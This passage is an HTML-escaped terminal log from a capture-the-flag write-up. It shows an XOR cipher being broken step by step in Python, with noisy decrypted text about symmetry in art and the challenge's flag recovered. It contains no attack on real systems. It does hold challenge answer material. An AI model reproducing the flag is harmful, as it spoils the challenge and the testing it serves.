style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;divi6int lIne ~ppearrmoae Or lzss th7 srme&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0e\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;So?here ;s ghe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;flax: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hg3mehX0R_i52a_uS34U184nD$fUQny_C1&amp;#34;H3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3
Python &lt;span style=&#34;color:#ae81ff&#34;&gt;3.8.5&lt;/span&gt; (default, Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;)
[GCC &lt;span style=&#34;color:#ae81ff&#34;&gt;9.3.0&lt;/span&gt;] on linux
Type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more information&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;o&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; chr(&lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;)
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3 solve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;span style=&#34;color:#ae81ff&#34;&gt;1069&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Symmet y zn Art is whe&amp;lt; t{e Elements o4 &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r pAinting orrdrrwiNg balancereaph Other &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;out| T{is&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;could be &amp;amp;he3obJects them!elees&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but it 1an3alSo relate &amp;amp;o polOrs and &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;o&amp;amp;hea cOmposition3l gecHniques.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Y=u ~ay&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;not reali(e zt,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but your 0razn *is busy w=rkzng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;behind th7 spenEs to seekr&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;oft Symmetry w:en3yoU look at 3 prinTing. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The e rre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;several r7as|ns&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;for this.rThv &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;First is t:at3we&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x07&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;re hard-w;rew tO look forr&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ig. our ancien&amp;amp; a}ceStors may &amp;lt;ot3haVe had &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a &amp;lt;amv fOr it, butrthvy Knew that &amp;amp;hezr *own bodie! wvre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;basicallyrsy~meTrical, asr&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wvre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;those of &amp;#34;otvntIal predat=rs3or&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;prey. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Th7reuorE, this ca?e zn Handy whet:er3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cHoosing a ?atv, Catching d;nnvr Or &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;avoidi&amp;lt;g qeiNg on the ?enf oF a snarli&amp;lt;g,3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hUngry packrof3woLves or be3rs2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;TAke a lookrat3yoUr face inrthv mIrror &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;andrimrgiNe a line !trrigHt down th7 &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;~idDle. You&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;l&amp;gt; sve Both sidesrof3yoUr &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;face a e creTty symmet icrl.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;This is &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;9nodn As bilater3l `ymMetry and ;t&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;` &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Where bothrsiwes&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;either si6e |f This &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;divi6int lIne appearrmoae Or less th7 srme&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0e\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;So here ;s ghe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;flag: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hg3mehX0R_i5-a_uS34U184nD$fUNny_C1&amp;#34;H3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3
Python &lt;span style=&#34;color:#ae81ff&#34;&gt;3.8.5&lt;/span&gt; (default, Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;)
[GCC &lt;span style=&#34;color:#ae81ff&#34;&gt;9.3.0&lt;/span&gt;] on linux
Type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more information&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;i&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; chr(&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;)
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3 solve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;span style=&#34;color:#ae81ff&#34;&gt;1069&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Symmetry zn Art is when t{e Elements of &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r pAinting or drrwiNg balance eaph Other &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;out. T{is&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;could be the3obJects themselees&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but it can3alSo relate to polOrs and &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;othea cOmpositional gecHniques.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;You ~ay&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;not realize zt,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but your brazn *is busy workzng&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;behind the spenEs to seek &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;oft Symmetry when3yoU look at a prinTing. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;There rre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;several reas|ns&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;for this. Thv &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;First is that3we&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x07&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;re hard-wirew tO look for &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ig. our ancient a}ceStors may not3haVe had &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a namv fOr it, but thvy Knew that thezr *own bodies wvre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;basically sy~meTrical, as &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wvre&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;those of potvntIal predators3or&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;prey. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ThereuorE, this came zn Handy whether3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cHoosing a matv, Catching dinnvr Or &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;avoiding qeiNg on the menf oF a snarling,3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hUngry pack of3woLves or bears2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;TAke a look at3yoUr face in thv mIrror &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;and imrgiNe a line strrigHt down the &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;~idDle. You&amp;#39;ll sve Both sides of3yoUr &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;face are creTty symmetricrl.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;This is &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;knodn As bilateral `ymMetry and it&amp;#39;` &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Where both siwes&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;either side |f This &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;dividint lIne appear moae Or less the srme&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0e\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;So here is ghe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;flag: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hgamehX0R_i5-a_uS3fU184nD$fUNny_C1pH3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3
Python &lt;span style=&#34;color:#ae81ff&#34;&gt;3.8.5&lt;/span&gt; (default, Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;)
[GCC &lt;span style=&#34;color:#ae81ff&#34;&gt;9.3.0&lt;/span&gt;] on linux
Type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more information&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; chr(&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;)
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
ubuntu&lt;span style=&#34;color:#a6e22e&#34;&gt;@DESKTOP&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mnt&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;HGAME&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cipher&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; python3 solve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;span style=&#34;color:#ae81ff&#34;&gt;1069&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Symmetry zn art is when t{e elements of &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r painting or drrwing balance eaph other &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;out. T{is could be the3objects themselees, &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;but it can3also relate to polors and &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;othea compositional gechniques.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;You ~ay not realize zt, but your brazn &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;is busy workzng behind the spenes to seek &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;oft symmetry when3you look at a printing. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;There rre several reas|ns for this. Thv &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;first is that3we&amp;#39;re hard-wirew to look for &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ig. Our ancient a}cestors may not3have had &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a namv for it, but thvy knew that thezr &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;own bodies wvre basically sy~metrical, as &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wvre those of potvntial predators3or prey. &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Thereuore, this came zn handy whether3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;choosing a matv, catching dinnvr or &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;avoiding qeing on the menf of a snarling,3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hungry pack of3wolves or bears2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Take a look at3your face in thv mirror &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;and imrgine a line strright down the &lt;/span&gt;&lt;span 